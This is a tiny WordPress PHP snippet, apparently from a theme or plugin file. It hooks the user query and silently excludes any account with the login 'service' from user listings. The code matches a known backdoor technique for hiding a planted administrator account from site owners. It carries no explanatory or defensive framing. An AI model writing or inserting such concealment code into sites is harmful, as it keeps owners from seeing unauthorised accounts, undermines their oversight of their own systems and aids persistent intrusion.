<?php
add_action('pre_user_query', function ($query) {
$query->query_where .= " AND user_login != 'service'";
});
